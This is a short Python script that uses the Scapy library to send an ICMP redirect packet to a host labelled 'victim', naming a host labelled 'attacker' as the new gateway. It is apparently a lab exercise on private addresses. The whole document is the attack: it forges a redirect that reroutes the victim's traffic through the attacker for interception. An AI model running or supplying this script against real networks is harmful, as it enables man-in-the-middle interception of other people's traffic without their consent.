#! /usr/bin/env python
from scapy.all import *

# Preparing packet
victim = "192.168.62.60"
attacker = "192.168.40.50"
icmp_redirect_packet = IP(dst=victim)/ICMP(type=5,code=1,gw=attacker)
send(icmp_redirect_packet)
